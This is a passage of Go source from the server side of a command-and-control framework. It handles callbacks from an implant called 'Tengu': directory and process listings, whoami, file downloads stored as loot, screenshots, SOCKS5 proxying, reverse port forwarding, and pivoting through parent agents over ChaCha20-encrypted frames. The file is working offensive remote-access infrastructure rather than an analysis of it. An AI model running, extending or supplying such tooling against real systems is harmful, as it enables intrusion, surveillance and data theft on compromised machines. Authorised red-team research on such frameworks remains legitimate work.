					isLsUi = true
				case TENGU_PS_UI:
					isPsUi = true
				case TENGU_LS:
					isLs = true
				case TENGU_PS:
					isPs = true
				}
				break
			}
		}
		a.RequestCompleted(RequestID)

		if isLsUi {
			var raw map[string]interface{}
			if jsonErr := json.Unmarshal([]byte(output), &raw); jsonErr == nil {
				if pathStr, ok := raw["Path"].(string); ok {
					raw["Path"] = base64.StdEncoding.EncodeToString([]byte(pathStr))
				}
				rebuilt, _ := json.Marshal(raw)
				teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, map[string]string{
					"MiscType": "FileExplorer",
					"MiscData": base64.StdEncoding.EncodeToString(rebuilt),
				})
			} else {
				teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, map[string]string{
					"Type":    "Error",
					"Message": "ls;ui: failed to parse directory listing",
				})
			}
			return
		}

		if isPsUi {
			teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, map[string]string{
				"MiscType": "ProcessUI",
				"MiscData": base64.StdEncoding.EncodeToString([]byte(output)),
			})
			return
		}

		if isLs {
			if formatted := formatLsListing(output); formatted != "" {
				output = formatted
			}
		} else if isPs {
			if formatted := formatPsListing(output); formatted != "" {
				output = formatted
			}
		}

		out := map[string]string{
			"Type":   "Good",
			"Output": output,
		}
		if x := a.TakeTenguXfer(RequestID); x != nil {
			mergeTransfer(out, transferProgressMap(x.ID, x.Direction, x.Name, "done", x.Total, x.Total))
		}
		teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, out)

	case TENGU_WHOAMI:
		var username string
		if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			username = string(Parser.ParseBytes())
		}
		a.RequestCompleted(RequestID)
		if username != "" && username != a.Info.Username {
			a.Info.Username = username
			teamserver.AgentUpdate(a)
			teamserver.EventAgentUpdate(a.DisplayID, username)
		}
		teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, map[string]string{
			"Type":   "Good",
			"Output": username,
		})

	case COMMAND_ERROR:
		var output string
		if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			output = string(Parser.ParseBytes())
		}
		a.RequestCompleted(RequestID)
		errOut := map[string]string{
			"Type":    "Error",
			"Message": output,
		}
		if x := a.TakeTenguXfer(RequestID); x != nil {
			mergeTransfer(errOut, transferProgressMap(x.ID, x.Direction, x.Name, "error", 0, x.Total))
		}
		teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, errOut)

	case COMMAND_EXIT:
		teamserver.Died(a)
		a.RequestCompleted(RequestID)
		teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, map[string]string{
			"Type":    "Good",
			"Message": "Tengu agent has exited",
		})

	case TENGU_DOWNLOAD:
		if !Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
			logger.Debug("Tengu download: malformed packet")
			return
		}
		filename := string(Parser.ParseBytes())
		data := Parser.ParseBytes()

		savePath, err := logr.LogrInstance.WriteAgentFile(a.NameID, logr.LootKindDownload, filepath.Base(filename), data)
		if err != nil {
			teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, map[string]string{
				"Type":    "Error",
				"Message": "Failed to save file: " + err.Error(),
			})
			return
		}
		a.RequestCompleted(RequestID)
		dl := map[string]string{
			"Type":      "Good",
			"Message":   fmt.Sprintf("Downloaded %d bytes -> %s", len(data), savePath),
			"MiscType":  "download",
			"MiscData2": base64.StdEncoding.EncodeToString([]byte(filepath.Base(filename))) + ";" + common.ByteCountSI(int64(len(data))),
		}
		xferID := fmt.Sprintf("t-%08x", RequestID)
		if x := a.TakeTenguXfer(RequestID); x != nil {
			xferID = x.ID
		}
		dl["MiscData"] = transferProgressJSON(xferID, "down", filename, "done", int64(len(data)), int64(len(data)))
		teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, dl)

	case TENGU_SCREENSHOT:
		if !Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
			logger.Debug("Tengu screenshot: malformed packet")
			return
		}
		filename := string(Parser.ParseBytes())
		data := Parser.ParseBytes()

		if _, err := logr.LogrInstance.WriteAgentFile(a.NameID, logr.LootKindScreenshot, filepath.Base(filename), data); err != nil {
			teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, map[string]string{
				"Type":    "Error",
				"Message": "Failed to save screenshot: " + err.Error(),
			})
			return
		}
		a.RequestCompleted(RequestID)
		teamserver.AgentConsole(a.DisplayID, MUGEN_CONSOLE_MESSAGE, map[string]string{
			"Type":      "Good",
			"Message":   fmt.Sprintf("Screenshot captured (%d bytes)", len(data)),
			"MiscType":  "screenshot",
			"MiscData":  base64.StdEncoding.EncodeToString(data),
			"MiscData2": filename,
		})

	case TENGU_SOCKS5_DATA:
		if !Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			return
		}
		connID := uint32(Parser.ParseInt32())
		var data []byte
		if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			data = Parser.ParseBytes()
		}
		if a.TenguSocks5 != nil {
			a.TenguSocks5.OnAgentData(connID, data)
		}

	case TENGU_SOCKS5_CLOSE:
		if !Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			return
		}
		connID := uint32(Parser.ParseInt32())
		if a.TenguSocks5 != nil {
			a.TenguSocks5.OnAgentClose(connID)
		}

	case TENGU_RPORTFWD_DATA:
		if !Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			return
		}
		connID := uint32(Parser.ParseInt32())
		var data []byte
		if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			data = Parser.ParseBytes()
		}
		if a.TenguRportfwd != nil {
			a.TenguRportfwd.OnAgentData(connID, data)
		}

	case TENGU_RPORTFWD_CLOSE:
		if !Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			return
		}
		connID := uint32(Parser.ParseInt32())
		if a.TenguRportfwd != nil {
			a.TenguRportfwd.OnAgentClose(connID)
		}

	case TENGU_PIVOT_TCP_DATA:
		// A child Tengu sent a frame via the parent.
		// Parse: [child_id: 4B BE][frame_size: 4B BE][frame_bytes]
		if !Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			return
		}
		childID := int(uint32(Parser.ParseInt32()))
		if !Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			return
		}
		frameData := Parser.ParseBytes()

		// Parse the child's Tengu packet and dispatch it.
		childHeader, err := ParseHeader(frameData)
		if err != nil {
			logger.Debug(fmt.Sprintf("Tengu pivot: failed to parse child frame: %v", err))
			return
		}
		// Use the AgentID from the child's header as the identifier.
		// TenguHandlePivotFrame handles registration and job dispatch.
		resp := TenguHandlePivotFrame(teamserver, childHeader)
		if resp != nil {
			// Queue the response for the child via the parent.
			a.AddJobToQueue(Job{
				Command:   TENGU_PIVOT_TCP_DATA,
				RequestID: 0,
				Data:      []interface{}{uint32(childID), resp},
			})
		}

	case TENGU_PIVOT_TCP_DISCONN:
		// A child disconnected from the parent.
		if !Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			return
		}
		childID := int(uint32(Parser.ParseInt32()))
		childAgent := teamserver.AgentInstance(childID)
		if childAgent != nil {
			teamserver.Died(childAgent)
		}

	default:
		logger.Debug(fmt.Sprintf("Tengu: unhandled CommandID 0x%x from %s", CommandID, a.NameID))
	}
}

// TenguHandlePivotFrame processes a Tengu frame received through a TCP pivot parent.
// It handles INIT registration and COMMAND_GET_JOB polling.
// Returns the raw response bytes to send back to the agent (via the parent).
// TenguDecrypt decrypts a ChaCha20-encrypted Tengu frame in place.
// Expected layout of p.Buffer(): [Nonce:12][Ciphertext].
func TenguDecrypt(key []byte, p *parser.Parser) (*parser.Parser, bool) {
	raw := p.Buffer()
	if len(raw) < 12 {
		return nil, false
	}
	nonce := raw[:12]
	ciphertext := make([]byte, len(raw)-12)
	copy(ciphertext, raw[12:])

	stream, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return nil, false
	}
	stream.XORKeyStream(ciphertext, ciphertext)
	return parser.NewParser(ciphertext), true
}

// TenguEncrypt encrypts payload with the agent's ChaCha20 key.
// Returns [Nonce:12][Ciphertext].
func TenguEncrypt(key []byte, payload []byte) ([]byte, error) {
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	stream, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return nil, err
	}
	ct := make([]byte, len(payload))
	stream.XORKeyStream(ct, payload)
	return append(nonce, ct...), nil
}

func TenguHandlePivotFrame(teamserver TeamServer, Header Header) []byte {
	if !teamserver.AgentExist(Header.AgentID) {
		return nil
	}

	Agent := teamserver.AgentInstance(Header.AgentID)
	Agent.UpdateLastCallback(teamserver)

	/* Decrypt the incoming frame if the session has a ChaCha20 key. */
	if len(Agent.Encryption.ChaCha20Key) == 32 {
		decrypted, ok := TenguDecrypt(Agent.Encryption.ChaCha20Key, Header.Data)
		if !ok {
			logger.Error(fmt.Sprintf("TenguHandlePivotFrame: failed to decrypt frame from %x", Header.AgentID))
			return nil
		}
		Header.Data = decrypted
	}

	if !Header.Data.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
		return nil
	}

	Command := uint32(Header.Data.ParseInt32())
	RequestID := uint32(Header.Data.ParseInt32())

	var payload []byte
	if Command == COMMAND_GET_JOB {
		var jobs []Job
		if len(Agent.JobQueue) == 0 {
			jobs = []Job{{Command: COMMAND_NOJOB}}
		} else {
			jobs = Agent.GetQueuedJobs()
		}
		payload = BuildTenguMessage(jobs)
		teamserver.TaskMarkSent(jobs)
	} else {
		/* Task result - dispatch and reply with NOJOB so the Tengu doesn't
		   block on recv for 120s waiting for a response that never comes. */
		if Header.Data.CanIRead([]parser.ReadType{parser.ReadBytes}) {
			resultData := Header.Data.ParseBytes()
			Agent.TenguTaskDispatch(RequestID, Command, parser.NewParser(resultData), teamserver)
		} else {
			Agent.TenguTaskDispatch(RequestID, Command, parser.NewParser([]byte{}), teamserver)
		}
		payload = BuildTenguMessage([]Job{{Command: COMMAND_NOJOB}})
	}

	/* Encrypt the response if the session has a ChaCha20 key. */
	if len(Agent.Encryption.ChaCha20Key) == 32 {
		enc, err := TenguEncrypt(Agent.Encryption.ChaCha20Key, payload)
		if err != nil {
			logger.Error(fmt.Sprintf("TenguHandlePivotFrame: failed to encrypt response for %x", Header.AgentID))
			return nil
		}
		return enc
	}
	return payload
}
